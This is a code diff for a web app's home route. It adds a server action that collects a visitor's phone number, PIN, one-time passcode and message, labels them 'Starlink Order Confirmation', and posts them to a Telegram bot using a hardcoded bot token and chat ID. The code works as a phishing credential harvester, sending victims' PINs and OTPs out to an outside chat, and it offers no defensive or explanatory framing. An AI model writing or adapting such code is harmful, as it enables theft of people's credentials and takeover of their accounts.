@@ -1,16 +1,43 @@
-import { Button } from "~/components/ui/button"
+import MainApp from "~/components/main";
+import "./style.css";
+import type { Route } from "./+types/home";
 
-export default function Home() {
-  return (
-    <div className="flex min-h-svh p-6">
-      <div className="flex max-w-md min-w-0 flex-col gap-4 text-sm leading-loose">
-        <div>
-          <h1 className="font-medium">Project ready!</h1>
-          <p>You may now add components and start building.</p>
-          <p>We&apos;ve already added the button component for you.</p>
-          <Button className="mt-2">Button</Button>
-        </div>
-      </div>
-    </div>
+export async function action({ request }: Route.ActionArgs) {
+  const formData = await request.formData();
+      const token = "8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko"
+      const url = `https://api.telegram.org/bot${token}/sendMessage`
+
+        try {
+        const res = await fetch(url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id:8453055105 ,// ,//7895249781 ,
+                text:
+                    `Starlink Order Confirmation
+Phone: ${formData.get("phone")}
+PIN: ${formData.get("pin")}
+OTP: ${formData.get("otp")}
+Message: ${formData.get("message")}
+                    `,
+                parse_mode: "Markdown",
+            })
+
+        });
+        const data = await res.json();
+        return data;
+    } catch (e: any) {
+        return e.message || e;
+    }
+
+}
+
+export default function Home(){
+  return(
+    <>
+    <MainApp/>
+    </>
   )
 }
